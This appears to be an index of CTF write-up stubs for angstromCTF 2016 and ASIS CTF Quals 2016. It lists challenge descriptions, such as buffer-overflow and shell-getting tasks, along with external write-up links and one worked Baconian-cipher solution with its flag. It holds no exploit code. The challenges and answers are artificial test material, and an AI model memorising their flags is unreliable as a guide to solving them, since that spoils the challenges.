# angstromCTF 2016 : overflow1-50

**Category:** Binary
**Points:** 
**Solves:** 
**Description:**

> This program is vulnerable to a buffer overflow! Can you exploit it to run a shell and get the flag? You can solve this problem on our shell server at /problems/[overflow1](./overflow1), and the binary and source are provided. 


## Write-up

(TODO)

## Other write-ups and resources

* http://blog.oleaass.com/writeups/angstrom-ctf-2016-overflow-1/
* https://www.youtube.com/watch?v=sOKaxDdxsJc
# angstromCTF 2016 : overflow2-70

**Category:** Binary
**Points:** 
**Solves:** 
**Description:**

> Another program, another buffer overflow vulnerability! This time, though, there should be no way to get a shell! See if you can prove us wrong and get the flag on our shell sever. The binary for this problem is here, and source code is here. 


## Write-up

(TODO)

## Other write-ups and resources

* https://ctftime.org/writeup/3167
# angstromCTF 2016 : overflow3-80

**Category:** Binary
**Points:** 80
**Solves:** 
**Description:**

## Write-up

(TODO)

## Other write-ups and resources

* https://www.youtube.com/watch?v=pQ76OmaS4eg&feature=youtu.be
# angstromCTF 2016 : rop2libc-160

**Category:** Binary
**Points:** 
**Solves:** 
**Description:**

> This vulnerable program has ASLR and a non-executable stack! Can you figure out how to bypass all those mitigations and get a shell? The program is on the shell server, with the binary provided here and source provided here. 


## Write-up

(TODO)

## Other write-ups and resources

* none yet
# angstromCTF 2016 : shellcode-60

**Category:** Binary
**Points:** 
**Solves:** 
**Description:**



## Write-up

(TODO)

## Other write-ups and resources

* none yet
# angstromCTF 2016 : actf-casino-120

**Category:** Crypto
**Points:** 
**Solves:** 
**Description:**

> angstromCTF has set up a new CTF mini-game, running at web.angstromctf.com:1342. The code running the server has been released here. Win the game and get the flag! 
> 


## Write-up

(TODO)

## Other write-ups and resources

* none yet
# angstromCTF 2016 : artifact-20

**Category:** Crypto
**Points:** 
**Solves:** 
**Description:**

> While exploring ancient ruins, a strange message was found. Can you crack the message? 
> 


## Write-up

(TODO)

## Other write-ups and resources

* http://blog.oleaass.com/writeups/angstrom-ctf-2016-artifact/
* https://ctftime.org/writeup/3082
* http://ipushino.blogspot.com/2016/04/angstromctf2016-artifact-crypto-20.html
* https://ctftime.org/writeup/3199
# angstromCTF 2016 : brute-force-40

**Category:** Crypto
**Points:** 
**Solves:** 
**Description:**

> We have found the hex string "c8db257e50bc35bf721b11d333fe9fd6", which we believe to be a MD5 hash. 
> 


## Write-up

(TODO)

## Other write-ups and resources

* https://ctftime.org/writeup/3201
# angstromCTF 2016 : help-center-170

**Category:** Crypto
**Points:** 
**Solves:** 
**Description:**

> We have uncovered a help server that accepts encrypted commands. See if you can break in! It's running at web.angstromctf.com:1341. 
> 


## Write-up

(TODO)

## Other write-ups and resources

* none yet
# angstromCTF 2016 : my-accountant-160

**Category:** Crypto
**Points:** 
**Solves:** 
**Description:**

> While searching through some old files we found accounting sheets that could point to nefarious business. However, we only happen to have one page in plaintext. Could you recover the key? It will be a hex-encoded string. You can access the program they used for encryption here. 
> 


## Write-up

(TODO)

## Other write-ups and resources

* none yet
# angstromCTF 2016 : randomized-cipher-250

**Category:** Crypto
**Points:** 
**Solves:** 
**Description:**

> My friend has designed a cipher based around randomized boxes in a SP network. For some reason I don't think this is secure. Could you recover the key for me? The flag is the key, hex-encoded. The server is running at web.angstromctf.com:1343. 
> 


## Write-up

(TODO)

## Other write-ups and resources

* none yet
# angstromCTF 2016 : rsa-fun-240

**Category:** Crypto
**Points:** 
**Solves:** 
**Description:**

> George was sending an encrypted message to me, as well as the RSA private key used to encrypt it. Somehow, part of the message got garbled up and then the transmission suddenly cut off. Can you recover the message George was sending? 
> 


## Write-up

(TODO)

## Other write-ups and resources

* none yet
# angstromCTF 2016 : shakespeare-60

**Category:** Crypto
**Points:** 
**Solves:** 
**Description:**

> We have uncovered a Shakespearean-era transmission that seems perfectly ordinary. Can you help us find the hidden message in this Hamlet soliloquy?
> Hint: Who do some claim wrote the plays normally attributed to Shakespeare? The flag will be a lower-case string with no spaces.



## Write-up

We are given a single Word Document for this challenge. Upon opening it with Word 2016 we find the opening of the famous soliloquy from Shakespeare's Hamlet.

![Hamlet Text](https://github.com/jashanbhoora/write-ups-2016/blob/master/angstromctf-2016/crypto/shakespeare-60/shakespeare-1.jpg)

There's nothing obvious that stands out in the text, and there doesn't seem to be anything embedded in the document.
Following the hint, I searched for "Shakespeare conspiracies", and the third result gave me what I was looking for: [The Shakespeare Authorship Question](https://en.wikipedia.org/wiki/Shakespeare_authorship_question)

To quote the page: "The Shakespeare authorship question is the argument that someone other than William Shakespeare of Stratford-upon-Avon wrote the works attributed to him"..."The controversy has since spawned a vast body of literature, and more than 80 authorship candidates have been proposed, the most popular being Sir Francis Bacon; Edward de Vere, 17th Earl of Oxford; Christopher Marlowe; and William Stanley, 6th Earl of Derby."

Reading these names prompted me to start searching for encryption methods related to the supposed authors. Sir Francis Bacon was first, so I started off by searching for "Bacon encoding"...
And what do you know! It turns out Sir Bacon devised a form of steganography that is commonly called the [Baconian Cipher](https://en.wikipedia.org/wiki/Bacon%27s_cipher)!

The Wikipedia article does a pretty good job of explaining it, so I won't go into the details here. To summarise, Baconian Ciphers encode data in the presentation of the text, and not the text itself. After a bit of thought and experimentation, I realised that the body of text we had been given used two different (but visibly identical) fonts: Calibri Light (Headings) and Calibri (Body).

![Hamlet Text](https://github.com/jashanbhoora/write-ups-2016/blob/master/angstromctf-2016/crypto/shakespeare-60/shakespeare-2.jpg)

I used Word's "Select Text with Similar Formatting" tool to grab all of one of the fonts, then used Shift+F3 to make the selection all uppercase. I also removed any non-alphabetic from the string at this point, which left me with: tOBeoRNottOBeTHATiStHeQueSTIONWHetHErTISnOBlERINTHeMInDtOSuffERThESlINGSaNDaRRowSOFoUTRAGEoUSFoRtuNeORTOTAkeARMSaGAINStaSEAofTRoUBlESANDbYOPpOSInGEnDTHEM

This then needed to be converted to the A/B string that Baconian Ciphers use. I did this with a couple of lines of Python.

```python
intext = "tOBeoRNottOBeTHATiStHeQueSTIONWHetHErTISnOBlERINTHeMInDtOSuffERThESlINGSaNDaRRowSOFoUTRAGEoUSFoRtuNeORTOTAkeARMSaGAINStaSEAofTRoUBlESANDbYOPpOSInGEnDTHEM"
outtext = ""
for c in intext:
    if c.isupper():
            outtext += "B"
    else:
            outtext += "A"

print outtext
'ABBAABBAAABBABBBBABABABAABBBBBBBAABBABBBABBABBBBBBABBABABBAAABBBABBABBBBABBABBAABBBABBBBBBABBBABAABABBBBBBAABBBBABBBBBAABBBAABBABBABBBBBABBBABBBABBABBBBB'
```

Finally, I plugged the resulting string into an online [Baconian Cipher Decoder](http://www.geocachingtoolbox.com/index.php?page=baconianCipher) and fiddling around with the parameters I get this:
> theflagisastreetcarnameddeqire

I must have gotten something very slightly wrong somewhere down the line... Anyway, the flag is easy to work out from here.

Flag: *astreetcarnameddesire*

## Other write-ups and resources

* https://github.com/jashanbhoora/write-ups-2016/tree/master/angstromctf-2016/crypto/shakespeare-60
# angstromCTF 2016 : spqr-10

**Category:** Crypto
**Points:** 
**Solves:** 
**Description:**

> We found this message written on a piece of parchment in the ruins of ancient Rome. What could it mean?
> 
> uxptkx_max_bwxl_hy_ftkva


## Write-up

(TODO)

## Other write-ups and resources

* http://blog.oleaass.com/writeups/angstrom-ctf-2016-spqr/
* https://ctftime.org/writeup/3080
* http://ipushino.blogspot.com/2016/04/angstromctf-2016-spqr-crypto-10.html
* https://github.com/qux-bbb/AngstromCTF-2016.git
* https://ctftime.org/writeup/3197
* https://github.com/MrMugiwara/WriteupsCTF/blob/master/AngstromCTF2016/Crypto10/README.md
# angstromCTF 2016 : what-a-drag-90

**Category:** Crypto
**Points:** 
**Solves:** 
**Description:**

> We have found a hex string that we believe is encrypted using a multiple time pad. Can you crack it given just ciphertext? 
> 


## Write-up

(TODO)

## Other write-ups and resources

* none yet
# angstromCTF 2016 : what-the-hex-15

**Category:** Crypto
**Points:** 
**Solves:** 
**Description:**

> Decode using hex and see what you get...
> 
> 6236343a20615735305a584a755a58526659323975646d567963326c76626c3930623239736331397962324e7


## Write-up

(TODO)

## Other write-ups and resources

* http://blog.oleaass.com/writeups/angstrom-ctf-2016-what-the-hex/
* https://ctftime.org/writeup/3081
* http://ipushino.blogspot.com/2016/04/angstromctf-2016-what-hex-crypto-15.html
* https://github.com/ctfs/write-ups-2016/tree/master/angstromctf-2016/crypto/what-the-hex-15
* https://github.com/MrMugiwara/WriteupsCTF/tree/master/AngstromCTF2016/What-the-Hex
# angstromCTF 2016 : fender-blender-70

**Category:** Forensics
**Points:** 
**Solves:** 
**Description:**

> defund rendered 5 images from his blender. What are the frame numbers? There are 5000 frames in total. Submit the frame numbers in numerical order in the format flag{<num1>,<num2>,<num3>,<num4>,<num5>}. 
> 


## Write-up

(TODO)

## Other write-ups and resources

* none yet
# angstromCTF 2016 : headsup-30

**Category:** Forensics
**Points:** 
**Solves:** 
**Description:**

> We're having trouble opening this PDF. Can you figure out what's wrong with it? 
> 


## Write-up

(TODO)

## Other write-ups and resources

* none yet
# angstromCTF 2016 : metasploitable-120

**Category:** Forensics
**Points:** 
**Solves:** 
**Description:**

> Our Wordpress blog has been hacked! Fortunately, the network capture from our intrusion detection system may provide some clues. Can you help us figure out what the hacker did? 
> 


## Write-up

(TODO)

## Other write-ups and resources

* http://blog.oleaass.com/writeups/angstrom-ctf-2016-metasploitable/
# angstromCTF 2016 : music-to-my-ears-130

**Category:** Forensics
**Points:** 
**Solves:** 
**Description:**

> You recently heard a performance of Beethoven's πth Piano Concerto, the "Flag Concerto". As it turns out, this virtuosic piece actually contains a hidden musical message. Can you seek it out and find the flag? 
> 


## Write-up

(TODO)

## Other write-ups and resources

* none yet
# angstromCTF 2016 : recovery-10

**Category:** Forensics
**Points:** 
**Solves:** 
**Description:**

> We recieved this disk image from the No Such Agency a few days ago. A hacker hid the password for his computer in this image. Can you find it for us? 
> 
> 
> <https://mega.nz/>#!4p5xGZBZ!a93j_N_InbJfkuYhr130mMzezRT2yk59oa21p9hFLH0
> 


## Write-up

(TODO)

## Other write-ups and resources

* http://ipushino.blogspot.com/2016/04/angstromctf-2016-recovery-forensics-10.html
# angstromCTF 2016 : volatile-90

**Category:** Forensics
**Points:** 
**Solves:** 
**Description:**

> Help! One of our machines has been compromised! We have a memory dump. Find the suspicious process. The machine was running Windows XP service pack 2. 
> 
> 
> <https://mega.co.nz/>#!Bg5B3DTD!dgaV9sklrXPop2w-BdE63t2FUIrUb_8fEL-HQqtMhaM


## Write-up

(TODO)

## Other write-ups and resources

* https://ctftime.org/writeup/3086
* https://github.com/MrMugiwara/WriteupsCTF/blob/master/AngstromCTF2016/Volatile90/README.md
# angstromCTF 2016 : wherizmaicheezburgr

**Category:** Forensics
**Points:** 80
**Solves:** 
**Description:**

> Halp! I lost my cheezburger and I can't find it! It's in this file somewere, can you be finds it? K Thx m8 much appreciat. 
> 
> 
> <https://mega.nz/>#!twxUya5K!hHtQR5AralewwC14q5-EQK4H75DP6-c4bz9tlvEPeY0


## Write-up

(TODO)

## Other write-ups and resources

* http://blog.oleaass.com/writeups/angstrom-ctf-2016-wher-iz-mai-cheezburgr/
# angstromCTF 2016 : whoops-30

**Category:** Forensics
**Points:** 
**Solves:** 
**Description:**

> Whoops! I accidentally deleted the book I was reading from my flash drive!! I made an image of the drive afterwards though! Can you find the book, and the flag in it? 
> 
> 
> <https://mega.nz/>#!w5JCgAaa!qIPmjSIoxfQGqkLbhYc4rwVBmhUnBaXAAlQu1mTAWVU


## Write-up

(TODO)

## Other write-ups and resources

* http://ipushino.blogspot.com/2016/04/angstromctf-2016-whoops-forenscis30.html
# angstromCTF 2016 : yankovic-60

**Category:** Forensics
**Points:** 
**Solves:** 
**Description:**

> What could be hiding behind "Weird Al" Yankovic's sculpted visage? Find out and get the flag! 
> 


## Write-up

(TODO)

## Other write-ups and resources

* none yet
# angstromCTF 2016 : asm-tracing-45

**Category:** Re
**Points:** 
**Solves:** 
**Description:**

> Reading assembly language is one of the core skills for reverse engineering. Test your abilities by tracing this code and seeing what %eax contains by the end! Enter the result as an unsigned decimal integer. 
> 


## Write-up

(TODO)

## Other write-ups and resources

* none yet
# angstromCTF 2016 : java-is-the-best-50

**Category:** Re
**Points:** 
**Solves:** 
**Description:**

> What kind of input makes this program happy? 
> 


## Write-up

(TODO)

## Other write-ups and resources

* http://blog.oleaass.com/writeups/angstrom-ctf-2016-java-is-the-best/
* https://ctftime.org/writeup/3085
* http://ipushino.blogspot.com/2016/04/angstromctf2016-java-is-best-re-50.html
# angstromCTF 2016 : sea-cipher-100

**Category:** Re
**Points:** 
**Solves:** 
**Description:**

> We have recovered an encrypted book and the encryption program used to secure it. Could you decrypt this for us, please?
> 
> teusbfslkt_kwruzo_sjsa_kursmwfsl 


## Write-up

(TODO)

## Other write-ups and resources

* none yet
# angstromCTF 2016 : sea-cipher-2-170

**Category:** Re
**Points:** 
**Solves:** 
**Description:**

> We have recovered an encrypted book and the encryption program used to secure it. Could you decrypt this for us, please?
> 
> teusbfslkt_kwruzo_sjsa_kursmwfsl 


## Write-up

(TODO)

## Other write-ups and resources

* none yet
# angstromCTF 2016 : smartest-encryption-70

**Category:** Re
**Points:** 
**Solves:** 
**Description:**

> Help! My friend encrypted his favourite image and forgot the password. He encrypted it with this software. 
> 


## Write-up

(TODO)

## Other write-ups and resources

* http://ipushino.blogspot.com/2016/04/angstromctf2016-smartest-encryption-re.html
# angstromCTF 2016 write-ups

* [https://angstromctf.com](https://angstromctf.com)
* [Scoreboard](https://angstromctf.com/scoreboard/) or [local alternative (TODO)](TODOLOCAL)

## Repo-local write-ups

* [crypto/shakespeare-60](crypto/shakespeare-60)

## External write-ups only

* [binary/overflow3-80](binary/overflow3-80)
* [binary/overflow1-50](binary/overflow1-50)
* [binary/format1-100](binary/format1-100)
* [binary/overflow2-70](binary/overflow2-70)
* [binary/endian-of-the-world-40](binary/endian-of-the-world-40)
* [crypto/artifact-20](crypto/artifact-20)
* [crypto/what-the-hex-15](crypto/what-the-hex-15)
* [crypto/brute-force-40](crypto/brute-force-40)
* [crypto/spqr-10](crypto/spqr-10)
* [forensics/wherizmaicheezburgr](forensics/wherizmaicheezburgr)
* [forensics/volatile-90](forensics/volatile-90)
* [forensics/whoops-30](forensics/whoops-30)
* [forensics/metasploitable-120](forensics/metasploitable-120)
* [forensics/recovery-10](forensics/recovery-10)
* [re/smartest-encryption-70](re/smartest-encryption-70)
* [re/java-is-the-best-50](re/java-is-the-best-50)
* [web/not-a-pastry-40](web/not-a-pastry-40)
* [web/amoebananas-20](web/amoebananas-20)
* [web/supersecure-30](web/supersecure-30)

## Missing write-ups

* [binary/answer-machine-110](binary/answer-machine-110)
* [binary/shellcode-60](binary/shellcode-60)
* [binary/rop2libc-160](binary/rop2libc-160)
* [crypto/actf-casino-120](crypto/actf-casino-120)
* [crypto/randomized-cipher-250](crypto/randomized-cipher-250)
* [crypto/my-accountant-160](crypto/my-accountant-160)
* [crypto/what-a-drag-90](crypto/what-a-drag-90)
* [crypto/help-center-170](crypto/help-center-170)
* [crypto/rsa-fun-240](crypto/rsa-fun-240)
* [forensics/yankovic-60](forensics/yankovic-60)
* [forensics/music-to-my-ears-130](forensics/music-to-my-ears-130)
* [forensics/fender-blender-70](forensics/fender-blender-70)
* [forensics/headsup-30](forensics/headsup-30)
* [re/sea-cipher-100](re/sea-cipher-100)
* [re/sea-cipher-2-170](re/sea-cipher-2-170)
* [re/asm-tracing-45](re/asm-tracing-45)
* [web/flag-locker-140](web/flag-locker-140)
# angstromCTF 2016 : amoebananas-20

**Category:** Web
**Points:** 
**Solves:** 
**Description:**

> The [amoeba](<http://web.angstromctf.com:1337/)> is a fascinating creature. 
> 


## Write-up

(TODO)

## Other write-ups and resources

* http://blog.oleaass.com/writeups/angstrom-ctf-2016-amoebananas/
* https://ctftime.org/writeup/3083
* http://ipushino.blogspot.com/2016/04/angstromctf2016-amoebananas-web-20.html
* https://ctftime.org/writeup/3198
# angstromCTF 2016 : flag-locker-140

**Category:** Web
**Points:** 
**Solves:** 
**Description:**

> Chris was trying to hack our [flag protection system](<http://web.angstromctf.com:1340/).> He didn't get the flag, but he did manage to get this PCAP of someone logging in, and a redacted copy of the application source. Can you finish the job and get the flag? 
> 


## Write-up

(TODO)

## Other write-ups and resources

* none yet
# angstromCTF 2016 : not-a-pastry-40

**Category:** Web
**Points:** 
**Solves:** 
**Description:**

> We've discovered a [mysterious website](<http://web.angstromctf.com:1339/).> Can you retrieve the flag? 
> 


## Write-up

(TODO)

## Other write-ups and resources

* http://blog.oleaass.com/writeups/angstrom-ctf-2016-not-a-pastry/
* http://ipushino.blogspot.com/2016/04/angstromctf-2016-not-pastry-web-40.html
# angstromCTF 2016 : supersecure-30

**Category:** Web
**Points:** 
**Solves:** 
**Description:**

> Jason made a new [SuperSecure™ website](<http://web.angstromctf.com:1338/),> but lost his password. It's displayed on the admin page. Can you login? 
> 


## Write-up

(TODO)

## Other write-ups and resources

* http://blog.oleaass.com/writeups/angstrom-ctf-2016-supersecure/
* https://ctftime.org/writeup/3084
* http://ipushino.blogspot.com/2016/04/angstromctf2016-supersecure-web-30.html
* https://ctftime.org/writeup/3200
# ASIS CTF Quals 2016 : cache-storm-241

**Category:** Crypto
**Points:** 241
**Solves:** 7
**Description:**

Check the [cryptography](https://github.com/ctfs/write-ups-2016/tree/master/asisis-ctf-quals-2016/crypto/cache-storm-241/cache_storm), decrypt the message.


## Write-up

(TODO)

## Other write-ups and resources

* none yet
# ASIS CTF Quals 2016 : epid-lid-99

**Category:** Crypto
**Points:** 99
**Solves:** 15
**Description:**

[Mathematicians](https://github.com/ctfs/write-ups-2016/tree/master/asisis-ctf-quals-2016/crypto/epic-lid-99/EpicLid) are forever


## Write-up

(TODO)

## Other write-ups and resources

* none yet
# ASIS CTF Quals 2016 : haran-333

**Category:** Crypto
**Points:** 333
**Solves:** 5
**Description:**

After figuring out the [cryptography system](https://github.com/ctfs/write-ups-2016/tree/master/asisis-ctf-quals-2016/crypto/Haran), decrypt the message.

## Write-up

(TODO)

## Other write-ups and resources

* none yet
# ASIS CTF Quals 2016 : kdm-rsa-156

**Category:** Crypto
**Points:** 156
**Solves:** 5
**Description:**

[RSA](https://github.com/ctfs/write-ups-2016/tree/master/asisis-ctf-quals-2016/crypto/kdm-rsa-156/KDM) is a simple math problem, or is it?

## Write-up

(TODO)

## Other write-ups and resources

* none yet
# ASIS CTF Quals 2016 : my-oras1e-276

**Category:** Crypto
**Points:** 276
**Solves:** 9
**Description:**

ts a nice flag that Pythia has got there. It would be a shame if someone stole it!

    nc my-0RSA1e.asis-ctf.ir 31337

## Write-up

(TODO)

## Other write-ups and resources

* none yet
# ASIS CTF Quals 2016 : wacky-agent-75

**Category:** Crypto
**Points:** 75
**Solves:** 12
**Description:**

Rookie Agent strikes again! He tried to encrypt a [message](https://github.com/ctfs/write-ups-2016/tree/master/asisis-ctf-quals-2016/crypto/wacky-agent-75/Wacky-Agent), and now has forgotten what he has done!



## Write-up

(TODO)

## Other write-ups and resources

* http://sibears.ru/labs/ASIS-CTF-Quals-2016-Wacky-Agent/
# ASIS CTF Quals 2016 : zor-bit-224

**Category:** Crypto
**Points:** 224
**Solves:** 1
**Description:**

The flag is encrypted using the [given code](https://github.com/ctfs/write-ups-2016/tree/master/asisis-ctf-quals-2016/crypto/zor-bit-224/ZorBit), find it.


## Write-up

(TODO)

## Other write-ups and resources

* none yet
# ASIS CTF Quals 2016 : firtog-109

**Category:** Forensic
**Points:** 109
**Solves:** 113
**Description:**

[Obscurity](https://github.com/ctfs/write-ups-2016/tree/master/asis-ctf-quals-2016/forensics/firtog-109/firtog) is definitely not security.

## Write-up

(TODO)

## Other write-ups and resources

* http://p1kachu.pluggi.fr/writeup/forensics/2016/05/09/asisctf-forensics-firtog-writeup/
* http://b0tchsec.com/2016/asis/firtog
* http://sibears.ru/labs/ASIS-CTF-Quals-2016-firtog/
# ASIS CTF Quals 2016 : odrrere-166

**Category:** Forensic
**Points:** 166
**Solves:** 101
**Description:**

> [Chaos](https://github.com/ctfs/write-ups-2016/tree/master/asis-ctf-quals-2016/forensics/odrrere-166/odrrere) is merely order waiting to be deciphered
José Saramago, The Double



## Write-up

(TODO)

## Other write-ups and resources

* http://sibears.ru/labs/ASIS-CTF-Quals-2016-odrrere/
* http://countersite.org/articles/steganography/88-odrrere-forensicsstego-asis-ctf-2016.html
* http://lockboxx.blogspot.com/2016/05/asis-ctf-2016-quals-writeup-odrrere.html
* https://github.com/raccoons-team/ctf/tree/master/2016-05-07-asis-ctf-quals/odrrere
* https://blog.nfrost.me/2016/05/08/asis-ctf-quals-2016-odrrere.html
# ASIS CTF Quals 2016 : pottage-179

**Category:** Forensic
**Points:** 179
**Solves:** 1
**Description:**

Have a taste of this nice [pottage](https://github.com/ctfs/write-ups-2016/tree/master/asis-ctf-quals-2016/forensics/pottage-179/Pottage)!

## Write-up

(TODO)

## Other write-ups and resources

* none yet
# ASIS CTF Quals 2016 : angrymin-52

**Category:** Misc
**Points:** 52
**Solves:** 19
**Description:**

> Today, unfortunately I must inform you that I am resigning from my position at you company effective immediately. As each day passed by, it became more clear that you do not care about your customers nor your employees. While I may not be able to change your ways, at least I can stop helping you with my expertise.
> I have uploaded all the backups, documents and manuals on [here](https://github.com/ctfs/write-ups-2016/tree/master/asis-ctf-quals-2016/misc/angrymin-52/angrymin) . If you find some other sys-admin stupid enough to work for you, those files are more than enough to help him get started. Meanwhile, I am keeping the username and password for the [firewall](http://juniper.asis-ctf.ir/), just to annoy you.
> 
> Burn in hell,
> 
> yours truly
> 
> sys-admin
Would you help this poor boss to find specific username and password?

4 ≠ 6


## Write-up

(TODO)

## Other write-ups and resources

* https://ctf.rip/asis-ctf-2016-angrymin-misc-challenge/
* https://github.com/raccoons-team/ctf/blob/master/2016-05-07-asis-ctf-quals/angrymin
# ASIS CTF Quals 2016 : battle-371

**Category:** Misc
**Points:** 371
**Solves:** 12
**Description:**

[Objects](https://github.com/ctfs/write-ups-2016/tree/master/asis-ctf-quals-2016/misc/battle-371/Battle) in the mirror are farther than they appear!

## Write-up

(TODO)

## Other write-ups and resources

* none yet
# ASIS CTF Quals 2016 : bonus-point-44

**Category:** Misc
**Points:** 44
**Solves:** 17
**Description:**

There will be bonus points for the teams that submit most interesting ASIS CTF related stuff including screenshots , CTF tools, codes, any bugs from scoreboard or tasks (if you have :D) and so on.

You can send them to quals2016@asis-ctf.ir and make sure to change the subject to “Bonus Point”

## Write-up

(TODO)

## Other write-ups and resources

* none yet
# ASIS CTF Quals 2016 : broadcasting-74

**Category:** Misc
**Points:** 74
**Solves:** 7
**Description:**

Far away from earth, a few weird buddies want to send a message to their friends in earth! We managed to grab 124 [messages](https://github.com/ctfs/write-ups-2016/tree/master/asis-ctf-quals-2016/misc/broadcasting-74/Broadcasting)!! Nevertheless some noisy stuff worked against us, can you decode the message?

## Write-up

(TODO)

## Other write-ups and resources

* none yet
# ASIS CTF Quals 2016 : flag-example-1

**Category:** Misc
**Points:** 1
**Solves:** 46
**Description:**

Whats the flag [example](https://asis-ctf.ir/rules/) that describe flag style?

## Write-up

(TODO)

## Other write-ups and resources

* none yet
# ASIS CTF Quals 2016 : qrop-139

**Category:** Misc
**Points:** 139
**Solves:** 35
**Description:**

Whose idea was to multiply [these](https://github.com/ctfs/write-ups-2016/tree/master/asisis-ctf-quals-2016/misc/qrop-139/qrop_out) QR codes? Give me the originals already!



## Write-up

(TODO)

## Other write-ups and resources

* http://sibears.ru/labs/ASIS-CTF-Quals-2016-qrop/
# ASIS CTF Quals 2016 : vanta-black-124

**Category:** Misc
**Points:** 124
**Solves:** 0
**Description:**

[Blackest](http://asis-ctf.ir/tasks/VantaBlack_18f3895e2407daaa3a0b3c299972e6db4d5ab527b8cab8690bb1f138cd9e094b56f5bf04184bae80dffd69b044e2d02bab294a7838bf4605a4591cd1d53c0820) is the new black.

## Write-up

(TODO)

## Other write-ups and resources

* none yet
# ASIS CTF Quals 2016 : book-146

**Category:** Pwn
**Points:** 146
**Solves:** 29
**Description:**

Hey, This is our single-author [library](https://github.com/ctfs/write-ups-2016/tree/master/asisis-ctf-quals-2016/pwn/books-146/books). But after any sunset there's another sunrise. So be cool and pwn the Sun!

    nc books.asis-ctf.ir 13007




## Write-up

(TODO)

## Other write-ups and resources

* https://amritabi0s.wordpress.com/2016/06/11/asis-ctf-quals-2016-b00ks-writeup/
# ASIS CTF Quals 2016 : feap-101

**Category:** Pwn
**Points:** 101
**Solves:** 17
**Description:**

yet another [dramatical](https://github.com/ctfs/write-ups-2016/tree/master/asisis-ctf-quals-2016/pwn/feap-101/feap) notes db. mmm, i bet you good...

    nc feap.asis-ctf.ir 7331



## Write-up

(TODO)

## Other write-ups and resources

* https://blahcat.github.io/2016/05/09/asis-ctf-2016-feap.html
# ASIS CTF Quals 2016 : fun-pwn-299

**Category:** Pwn
**Points:** 299
**Solves:** 2
**Description:**

I've heard you are a good city manager. So we've created a [test](https://github.com/ctfs/write-ups-2016/tree/master/asisis-ctf-quals-2016/pwn/fun-pwn-299/funpwn) for you. pass the test so you can Capture The Flag.

    nc funpwn.asis-ctf.ir 1337




## Write-up

(TODO)

## Other write-ups and resources

* none yet
# ASIS CTF Quals 2016 : kerex-201

**Category:** Pwn
**Points:** 201
**Solves:** 2
**Description:**

Sometimes we should forget about ring3, it's time to own the ring0.

creds: asisctf:asisctf

    nc kerex.asis-ctf.ir 4515


## Write-up

(TODO)

## Other write-ups and resources

* none yet
# ASIS CTF Quals 2016 write-ups

* <https://asis-ctf.ir/>
* [Scoreboard](https://asis-ctf.ir/scoreboard/) or [local alternative](scoreboard)

## Repo-local write-ups

* none yet

## External write-ups only

* [pwn/book-146](pwn/book-146)
* [pwn/feap-101](pwn/feap-101)
* [reverse/leaked-license-64](reverse/leaked-license-64)
* [reverse/catch-me-87](reverse/catch-me-87)
* [forensic/odrrere-166](forensic/odrrere-166)
* [forensic/firtog-109](forensic/firtog-109)
* [misc/qrop-139](misc/qrop-139)
* [misc/angrymin-52](misc/angrymin-52)
* [crypto/wacky-agent-75](crypto/wacky-agent-75)
* [web/three-magic-267](web/three-magic-267)
* [web/binary-cloud-153](web/binary-cloud-153)

## Missing write-ups

* [pwn/fun-pwn-299](pwn/fun-pwn-299)
* [pwn/kerex-201](pwn/kerex-201)
* [reverse/goldstone-147](reverse/goldstone-147)
* [reverse/rose-313](reverse/rose-313)
* [reverse/putnam-211](reverse/putnam-211)
* [forensic/pottage-179](forensic/pottage-179)
* [misc/bonus-point-44](misc/bonus-point-44)
* [misc/flag-example-1](misc/flag-example-1)
* [misc/vanta-black-124](misc/vanta-black-124)
* [misc/broadcasting-74](misc/broadcasting-74)
* [misc/battle-371](misc/battle-371)
* [crypto/my-oras1e-276](crypto/my-oras1e-276)
* [crypto/kdm-rsa-156](crypto/kdm-rsa-156)
* [crypto/zor-bit-224](crypto/zor-bit-224)
* [crypto/haran-333](crypto/haran-333)
* [crypto/cache-storm-241](crypto/cache-storm-241)
* [crypto/epid-lid-99](crypto/epid-lid-99)
* [web/master-of-hiphop-212](web/master-of-hiphop-212)
# ASIS CTF Quals 2016 : catch-me-87

**Category:** Reverse
**Points:** 87
**Solves:** 51
**Description:**

[Catch me](https://github.com/ctfs/write-ups-2016/tree/master/asisis-ctf-quals-2016/reversing/catch-me-87/Catch_Me) if you can!

## Write-up

(TODO)

## Other write-ups and resources

* http://vladz.devzero.fr/016_ASIS-CTF-catchme.html
* https://github.com/raccoons-team/ctf/tree/master/2016-05-07-asis-ctf-quals/catch_me
* http://sibears.ru/labs/ASIS-CTF-quals-2016-catch-me/
# ASIS CTF Quals 2016 : goldstone-147

**Category:** Reverse
**Points:** 147
**Solves:** 0
**Description:**

> A coward dies a thousand times before his [death](https://github.com/ctfs/write-ups-2016/tree/master/asisis-ctf-quals-2016/reversing/goldstone-150/goldstone). The valiant never taste of death but once.
William Shakespeare

## Write-up

(TODO)

## Other write-ups and resources

* none yet
# ASIS CTF Quals 2016 : leaked-license-64

**Category:** Reverse
**Points:** 64
**Solves:** 3
**Description:**

I have borrowed this [software license](https://github.com/ctfs/write-ups-2016/tree/master/asisis-ctf-quals-2016/reverse/leaked-license-64/Leaked_License) and library from Big Brother of a friend of a friend! It would be nice if I could have forged a license for the ID of this years competition computer.



## Write-up

(TODO)

## Other write-ups and resources

* http://sibears.ru/labs/ASIS-CTF-Quals-2016-Leaked_License/
# ASIS CTF Quals 2016 : putnam-211

**Category:** Reverse
**Points:** 211
**Solves:** 2
**Description:**
In memory of Hilary [Putnam](https://github.com/ctfs/write-ups-2016/tree/master/asisis-ctf-quals-2016/reversing/putnam-211/putnam) 1926 - 2016


## Write-up

(TODO)

## Other write-ups and resources

* none yet
# ASIS CTF Quals 2016 : rose-313

**Category:** Reverse
**Points:** 313
**Solves:** 0
**Description:**

Roses are red, violets are blue, This [task](https://github.com/ctfs/write-ups-2016/tree/master/asis-ctf-quals-2016/reversing/rose-313/Rose) is too hard, even for you!


## Write-up

(TODO)

## Other write-ups and resources

* none yet
# ASIS CTF Quals 2016 : binary-cloud-153

**Category:** Web
**Points:** 153
**Solves:** 33
**Description:**

Now you can [upload](https://binarycloud.asis-ctf.ir/) any types of files, temporarily.


## Write-up

(TODO)

## Other write-ups and resources

* https://ctf.rip/asis-ctf-2016-binarycloud-web-challenge/
* http://corb3nik.github.io/asis%202016/Binary-Cloud/
# ASIS CTF Quals 2016 : master-of-hiphop-212

**Category:** Web
**Points:** 212
**Solves:** 6
**Description:**

[HipHop](https://hiphop.asis-ctf.ir/hiphop) is amazing only when the performer is absolutely aware of what he's doing.


## Write-up

(TODO)

## Other write-ups and resources

* none yet
# ASIS CTF Quals 2016 : three-magic-267

**Category:** Web
**Points:** 267
**Solves:** 36
**Description:**

